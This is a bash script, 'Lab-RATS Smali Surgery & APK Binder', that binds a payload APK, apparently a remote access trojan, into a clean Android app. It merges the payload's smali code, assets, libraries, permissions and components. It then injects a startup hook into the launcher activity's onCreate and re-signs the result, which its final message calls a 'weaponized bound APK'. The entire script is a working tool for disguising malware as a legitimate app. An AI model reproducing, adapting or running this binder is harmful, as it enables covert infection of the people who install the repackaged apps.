#!/bin/bash

#################################################
#                   Lab-RATS                    #
#                                               #
#    Smali Surgery & APK Binding Script (Unix)  #
#                v1.6.0 Hardened                #
#                                               #
#             Developed by: K4N3CO              #
#################################################

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_DIR="$(dirname "$SCRIPT_DIR")"
WORK_DIR="$SCRIPT_DIR/temp_binder"
OUTPUT_DIR="$SCRIPT_DIR/output"
TOOLS_DIR="$SCRIPT_DIR/tools"

mkdir -p "$OUTPUT_DIR" "$TOOLS_DIR"

echo -e "${CYAN}"
echo " ┌───────────────────────────────────────────────────────────────────────┐"
echo " │               Lab-RATS Smali Surgery & APK Binder                    │"
echo " └───────────────────────────────────────────────────────────────────────┘"
echo -e "${NC}"

# 1. Target APK
if [ -z "$1" ]; then
    read -p "    Enter path to target clean APK: " TARGET_APK
else
    TARGET_APK="$1"
fi

if [ ! -f "$TARGET_APK" ]; then
    echo -e "${RED}[!] Target APK file not found: $TARGET_APK${NC}"
    exit 1
fi

TARGET_APK_DIR="$(cd "$(dirname "$TARGET_APK")" && pwd)"
TARGET_APK_NAME="$(basename "$TARGET_APK")"
TARGET_APK_ABS="$TARGET_APK_DIR/$TARGET_APK_NAME"

# 2. Payload APK
PAYLOAD_APK="$SCRIPT_DIR/output/signed_v1.apk"
if [ ! -f "$PAYLOAD_APK" ]; then
    PAYLOAD_APK="$PROJECT_DIR/app/build/outputs/apk/release/app-release.apk"
fi

if [ ! -f "$PAYLOAD_APK" ]; then
    echo -e "${YELLOW}[!] Payload APK (signed_v1.apk) not found. Building release payload now...${NC}"
    cd "$PROJECT_DIR"
    chmod +x gradlew
    ./gradlew assembleRelease --no-daemon
    if [ -f "$PROJECT_DIR/app/build/outputs/apk/release/app-release.apk" ]; then
        cp "$PROJECT_DIR/app/build/outputs/apk/release/app-release.apk" "$SCRIPT_DIR/output/signed_v1.apk"
        PAYLOAD_APK="$SCRIPT_DIR/output/signed_v1.apk"
    else
        echo -e "${RED}[!] Payload APK compilation failed.${NC}"
        exit 1
    fi
    cd "$SCRIPT_DIR"
fi

# 3. Detect / Download Apktool
APKTOOL_CMD=""
if command -v apktool &> /dev/null; then
    APKTOOL_CMD="apktool"
elif [ -f "$TOOLS_DIR/apktool.jar" ]; then
    APKTOOL_CMD="java -jar $TOOLS_DIR/apktool.jar"
else
    echo -e "${YELLOW}[!] apktool not found on system PATH. Downloading apktool.jar...${NC}"
    curl -sL -o "$TOOLS_DIR/apktool.jar" "https://github.com/iBotPeaches/Apktool/releases/download/v2.9.3/apktool_2.9.3.jar"
    if [ -f "$TOOLS_DIR/apktool.jar" ]; then
        echo -e "${GREEN}[✓] Downloaded apktool.jar${NC}"
        APKTOOL_CMD="java -jar $TOOLS_DIR/apktool.jar"
    else
        echo -e "${RED}[!] Failed to download apktool.jar. Please install apktool.${NC}"
        exit 1
    fi
fi

# Clean previous working dir
rm -rf "$WORK_DIR"
mkdir -p "$WORK_DIR"

PAYLOAD_DIR="$WORK_DIR/payload"
TARGET_DIR="$WORK_DIR/target"

# 4. Decompile APKs
echo -e "${CYAN}[*] Decompiling payload APK...${NC}"
$APKTOOL_CMD d -f -o "$PAYLOAD_DIR" "$PAYLOAD_APK"

if [ ! -d "$PAYLOAD_DIR" ]; then
    echo -e "${RED}[!] Payload APK decompilation failed.${NC}"
    rm -rf "$WORK_DIR"
    exit 1
fi

echo -e "${CYAN}[*] Decompiling target clean APK...${NC}"
$APKTOOL_CMD d -f -m -o "$TARGET_DIR" "$TARGET_APK_ABS"

if [ ! -d "$TARGET_DIR" ]; then
    echo -e "${YELLOW}[!] Decompiling with -m failed. Retrying standard decompilation...${NC}"
    $APKTOOL_CMD d -f -o "$TARGET_DIR" "$TARGET_APK_ABS"
fi

if [ ! -d "$TARGET_DIR" ]; then
    echo -e "${RED}[!] Target APK decompilation failed.${NC}"
    rm -rf "$WORK_DIR"
    exit 1
fi

# 5. Merge Smali Classes & Assets
echo -e "${CYAN}[*] Merging Smali bytecode and assets...${NC}"

# Find max smali_classes folder in target
MAX_IDX=1
for d in "$TARGET_DIR"/smali_classes*; do
    if [ -d "$d" ]; then
        NUM=$(echo "$d" | grep -o '[0-9]\+')
        if [ -n "$NUM" ] && [ "$NUM" -gt "$MAX_IDX" ]; then
            MAX_IDX=$NUM
        fi
    fi
done

NEXT_IDX=$((MAX_IDX + 1))
DEST_SMALI="$TARGET_DIR/smali_classes$NEXT_IDX"
mkdir -p "$DEST_SMALI"

# Copy com/labs/labrats and dependencies from payload to target smali_classesN
for ps in "$PAYLOAD_DIR"/smali*; do
    if [ -d "$ps" ]; then
        cp -rn "$ps"/* "$DEST_SMALI/" 2>/dev/null || true
    fi
done

# Copy Assets
if [ -d "$PAYLOAD_DIR/assets" ]; then
    mkdir -p "$TARGET_DIR/assets"
    cp -rn "$PAYLOAD_DIR/assets"/* "$TARGET_DIR/assets/" 2>/dev/null || true
fi

# Copy native libs if present
if [ -d "$PAYLOAD_DIR/lib" ]; then
    mkdir -p "$TARGET_DIR/lib"
    cp -rn "$PAYLOAD_DIR/lib"/* "$TARGET_DIR/lib/" 2>/dev/null || true
fi

echo -e "${GREEN}[✓] Smali classes and assets merged.${NC}"

# 6. AndroidManifest Surgery
echo -e "${CYAN}[*] Performing AndroidManifest.xml surgery...${NC}"

TARGET_MANIFEST="$TARGET_DIR/AndroidManifest.xml"
PAYLOAD_MANIFEST="$PAYLOAD_DIR/AndroidManifest.xml"

# Extract permissions from payload
grep -o '<uses-permission[^>]*/>' "$PAYLOAD_MANIFEST" | while read -r perm; do
    PERM_NAME=$(echo "$perm" | grep -o 'android:name="[^"]*"' | cut -d'"' -f2)
    if [ -n "$PERM_NAME" ] && ! grep -q "$PERM_NAME" "$TARGET_MANIFEST"; then
        sed -i.bak "s|<application|    $perm\n    <application|1" "$TARGET_MANIFEST"
    fi
done

# POSIX awk script to cleanly extract self-contained XML component blocks without splitting multiline tags
LABRATS_COMPS=$(awk '
BEGIN { RS="<"; FS=">" }
NR > 1 {
    tag = $0
    if (tag ~ /^(service|receiver|provider|activity)[^>]*com\.labs\.labrats/) {
        print "<" tag
    }
}
' "$PAYLOAD_MANIFEST")

echo "$LABRATS_COMPS" | while read -r comp; do
    if [ -n "$comp" ]; then
        COMP_NAME=$(echo "$comp" | grep -o 'android:name="[^"]*"' | cut -d'"' -f2)
        if [ -n "$COMP_NAME" ] && ! grep -q "$COMP_NAME" "$TARGET_MANIFEST"; then
            sed -i.bak "s|</application>|        $comp\n    </application>|1" "$TARGET_MANIFEST"
        fi
    fi
done

rm -f "$TARGET_MANIFEST.bak"
echo -e "${GREEN}[✓] Manifest surgery completed.${NC}"

# Sanitize target resources (Repair corrupt PNG signatures in pure Bash without Python)
if [ -d "$TARGET_DIR/res" ]; then
    echo -e "${CYAN}[*] Sanitizing target resources & PNG signatures...${NC}"
    VALID_PNG_B64="iVBORw0KGgoAAAANSU8EUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=="
    VALID_NINE_PNG_B64="iVBORw0KGgoAAAANSU8EUgAAAAMAAAADCAYAAABWKLW/AAAADElEQVR42mNkYGBgAAAABQABXvMqOAAAAABJRU5ErkJggg=="

    find "$TARGET_DIR/res" -type f \( -name "*.png" -o -name "*.jpg" -o -name "*.jpeg" \) 2>/dev/null | while read -r img_file; do
        HEX_HEADER=$(hexdump -n 4 -e '1/1 "%02x"' "$img_file" 2>/dev/null || xxd -l 4 -p "$img_file" 2>/dev/null)
        if [[ "$HEX_HEADER" != "89504e47" ]]; then
            echo -e "${YELLOW}    [!] Repairing corrupt image signature: $(basename "$img_file")${NC}"
            if [[ "$img_file" == *".9.png" ]]; then
                echo "$VALID_NINE_PNG_B64" | base64 -d > "$img_file" 2>/dev/null || echo "$VALID_NINE_PNG_B64" | base64 --decode > "$img_file" 2>/dev/null
            else
                echo "$VALID_PNG_B64" | base64 -d > "$img_file" 2>/dev/null || echo "$VALID_PNG_B64" | base64 --decode > "$img_file" 2>/dev/null
            fi
        fi
    done
fi

# 7. Identify Launcher Activity
echo -e "${CYAN}[*] Identifying Launcher Activity in target...${NC}"

PKG_NAME=$(grep -o 'package="[^"]*"' "$TARGET_MANIFEST" | head -n1 | cut -d'"' -f2)

# POSIX-compliant awk compatible with BSD awk (macOS) and GNU awk (Linux)
LAUNCHER_ACT=$(awk '
BEGIN { RS="<activity|<activity-alias"; FS=">" }
NR > 1 {
    block = $0
    if (block ~ /android\.intent\.category\.LAUNCHER/ && block ~ /android\.intent\.action\.MAIN/) {
        match_start = index(block, "android:name=\"")
        if (match_start > 0) {
            sub_str = substr(block, match_start + 14)
            quote_end = index(sub_str, "\"")
            if (quote_end > 0) {
                print substr(sub_str, 1, quote_end - 1)
                exit
            }
        }
    }
}
' "$TARGET_MANIFEST")

if [ -z "$LAUNCHER_ACT" ]; then
    echo -e "${RED}[!] Could not detect target Launcher Activity in AndroidManifest.xml${NC}"
    rm -rf "$WORK_DIR"
    exit 1
fi

if [[ "$LAUNCHER_ACT" == .* ]]; then
    LAUNCHER_ACT="${PKG_NAME}${LAUNCHER_ACT}"
elif [[ "$LAUNCHER_ACT" != *.* ]]; then
    LAUNCHER_ACT="${PKG_NAME}.${LAUNCHER_ACT}"
fi

REL_PATH="$(echo "$LAUNCHER_ACT" | tr '.' '/').smali"
TARGET_SMALI_FILE=$(find "$TARGET_DIR" -path "*/$REL_PATH" | head -n1)

# Fallback: Check if LAUNCHER_ACT is an activity-alias pointing to targetActivity
if [ -z "$TARGET_SMALI_FILE" ] || [ ! -f "$TARGET_SMALI_FILE" ]; then
    TARGET_ACT=$(grep -B 2 -A 5 "android:name=\"$LAUNCHER_ACT\"" "$TARGET_MANIFEST" | grep -o 'android:targetActivity="[^"]*"' | head -n1 | cut -d'"' -f2)
    if [ -n "$TARGET_ACT" ]; then
        if [[ "$TARGET_ACT" == .* ]]; then
            TARGET_ACT="${PKG_NAME}${TARGET_ACT}"
        elif [[ "$TARGET_ACT" != *.* ]]; then
            TARGET_ACT="${PKG_NAME}.${TARGET_ACT}"
        fi
        LAUNCHER_ACT="$TARGET_ACT"
        REL_PATH="$(echo "$LAUNCHER_ACT" | tr '.' '/').smali"
        TARGET_SMALI_FILE=$(find "$TARGET_DIR" -path "*/$REL_PATH" | head -n1)
    fi
fi

# Final fallback: search by class basename
if [ -z "$TARGET_SMALI_FILE" ] || [ ! -f "$TARGET_SMALI_FILE" ]; then
    TARGET_SMALI_FILE=$(find "$TARGET_DIR" -name "$(basename "$REL_PATH")" | head -n1)
fi

if [ -z "$TARGET_SMALI_FILE" ] || [ ! -f "$TARGET_SMALI_FILE" ]; then
    echo -e "${RED}[!] Could not find Smali file for launcher $LAUNCHER_ACT${NC}"
    rm -rf "$WORK_DIR"
    exit 1
fi

echo -e "${GREEN}[✓] Detected Launcher Activity: $LAUNCHER_ACT${NC}"
echo -e "${GREEN}[✓] Located Smali file: $TARGET_SMALI_FILE${NC}"

# 8. Inject Smali Hook
echo -e "${CYAN}[*] Injecting Lab-RATS startup hook into $TARGET_SMALI_FILE...${NC}"

if grep -q "\.method.*onCreate(" "$TARGET_SMALI_FILE"; then
    awk '
        /\.method.*onCreate\(/ {
            print $0
            print "    # Lab-RATS Smali Surgery Hook"
            print "    invoke-static {p0}, Lcom/labs/labrats/LabRatsWorker;->init(Landroid/content/Context;)V"
            next
        }
        { print }
    ' "$TARGET_SMALI_FILE" > "$TARGET_SMALI_FILE.tmp" && mv "$TARGET_SMALI_FILE.tmp" "$TARGET_SMALI_FILE"
    echo -e "${GREEN}[✓] Smali hook injected into existing onCreate().${NC}"
else
    cat >> "$TARGET_SMALI_FILE" << 'EOF'

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 0

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    # Lab-RATS Smali Surgery Hook
    invoke-static {p0}, Lcom/labs/labrats/LabRatsWorker;->init(Landroid/content/Context;)V

    return-void
.endmethod
EOF
    echo -e "${GREEN}[✓] Smali hook injected into new onCreate() method.${NC}"
fi

# Detect native Android SDK aapt / aapt2 binary (prefer stable 30-34 to prevent 37.0.0 SIGBUS exit code 138)
NATIVE_AAPT_FLAG=""
if [ -d "$HOME/Library/Android/sdk/build-tools" ]; then
    STABLE_BT=$(ls -d "$HOME/Library/Android/sdk/build-tools"/3[0-4]* 2>/dev/null | tail -n1)
    if [ -z "$STABLE_BT" ]; then
        STABLE_BT=$(ls -d "$HOME/Library/Android/sdk/build-tools"/* 2>/dev/null | grep -v "37" | tail -n1)
    fi
    if [ -n "$STABLE_BT" ] && [ -f "$STABLE_BT/aapt2" ]; then
        NATIVE_AAPT_FLAG="--aapt $STABLE_BT/aapt2"
    elif [ -n "$STABLE_BT" ] && [ -f "$STABLE_BT/aapt" ]; then
        NATIVE_AAPT_FLAG="--aapt $STABLE_BT/aapt"
    fi
elif command -v aapt2 &> /dev/null; then
    NATIVE_AAPT_FLAG="--aapt $(command -v aapt2)"
elif command -v aapt &> /dev/null; then
    NATIVE_AAPT_FLAG="--aapt $(command -v aapt)"
fi

# 9. Recompile & Sign
echo -e "${CYAN}[*] Rebuilding bound APK...${NC}"
UNSIGNED_APK="$WORK_DIR/unsigned_bound.apk"
ALIGNED_APK="$WORK_DIR/aligned_bound.apk"
FINAL_BOUND_APK="$OUTPUT_DIR/bound_target.apk"

# Attempt 1: Build with stable native AAPT if available
if [ -n "$NATIVE_AAPT_FLAG" ]; then
    $APKTOOL_CMD b $NATIVE_AAPT_FLAG --no-crunch "$TARGET_DIR" -o "$UNSIGNED_APK" 2>/dev/null
fi

# Attempt 2: Fallback to apktool's internal bundled AAPT2
if [ ! -f "$UNSIGNED_APK" ]; then
    echo -e "${YELLOW}[!] Retrying build with apktool's internal bundled AAPT2...${NC}"
    $APKTOOL_CMD b --no-crunch "$TARGET_DIR" -o "$UNSIGNED_APK" 2>/dev/null
fi

# Attempt 3: Build with -c (--copy-orig)
if [ ! -f "$UNSIGNED_APK" ]; then
    echo -e "${YELLOW}[!] Retrying build with original binary resources (-c)...${NC}"
    $APKTOOL_CMD b -c --no-crunch "$TARGET_DIR" -o "$UNSIGNED_APK" 2>/dev/null
fi

# Attempt 4: Fallback build with diagnostic log output
if [ ! -f "$UNSIGNED_APK" ]; then
    echo -e "${YELLOW}[!] Retrying build with full diagnostic output...${NC}"
    $APKTOOL_CMD b "$TARGET_DIR" -o "$UNSIGNED_APK"
fi

if [ ! -f "$UNSIGNED_APK" ]; then
    echo -e "${RED}[!] Rebuilding bound APK failed. Check apktool / aapt2 logs above.${NC}"
    rm -rf "$WORK_DIR"
    exit 1
fi

echo -e "${CYAN}[*] Aligning & Signing bound APK...${NC}"
if command -v zipalign &> /dev/null; then
    zipalign -f -v 4 "$UNSIGNED_APK" "$ALIGNED_APK"
else
    ALIGNED_APK="$UNSIGNED_APK"
fi

KEYSTORE_PATH="$PROJECT_DIR/lab-rats-keystore.jks"
if [ ! -f "$KEYSTORE_PATH" ]; then
    echo -e "${YELLOW}[!] Keystore missing. Generating new keystore...${NC}"
    keytool -genkeypair -alias "lab-rats-key" -keyalg RSA -keysize 2048 -validity 9125 -keystore "$KEYSTORE_PATH" -storepass "lab-rats123" -keypass "lab-rats123" -dname "CN=Lab-RATS Developer, O=Lab-RATS.LABS, C=US" 2>/dev/null
fi

if command -v apksigner &> /dev/null; then
    apksigner sign --ks "$KEYSTORE_PATH" --ks-pass "pass:lab-rats123" --ks-key-alias "lab-rats-key" --out "$FINAL_BOUND_APK" "$ALIGNED_APK"
elif command -v jarsigner &> /dev/null; then
    jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 -keystore "$KEYSTORE_PATH" -storepass "lab-rats123" "$ALIGNED_APK" "lab-rats-key"
    cp "$ALIGNED_APK" "$FINAL_BOUND_APK"
else
    echo -e "${RED}[!] Neither apksigner nor jarsigner found.${NC}"
    rm -rf "$WORK_DIR"
    exit 1
fi

rm -rf "$WORK_DIR"

echo -e "\n${GREEN}[✓] SUCCESS: WEAPONIZED BOUND APK CREATED AT:${NC}"
echo -e "${CYAN}    $FINAL_BOUND_APK${NC}\n"
